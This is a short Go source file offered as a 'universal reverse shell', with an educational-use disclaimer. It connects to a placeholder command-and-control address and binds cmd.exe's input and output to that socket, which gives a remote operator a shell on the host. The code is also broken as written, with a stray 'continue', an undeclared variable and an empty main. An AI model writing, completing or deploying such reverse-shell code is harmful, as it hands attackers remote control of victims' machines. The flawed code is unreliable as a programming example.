package main

// Simmple basic universal reverse shell
// ** ONLY USE FOR EDUCATIONAL PURPOSES ONLY **
// ** ILLEGAL TO USE ON ANYTHING WITHOUT EXPRESS PERMISSION FROM OWNER **

import "C"
import (
	"net"
	"os/exec"
	"time"
)

// send shell to remote server
func SendShell() {
	time.Sleep(5 * time.Second)
	// c2 connection
	conn, err := net.Dial("tcp", "<$IP>:<$PORT>")
	if err != nil {
		continue
	}

	// os spec shell
	cmd = exec.Command("cmd.exe")

	// send stdin/out,err to c2
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func main() {
	// blank
}
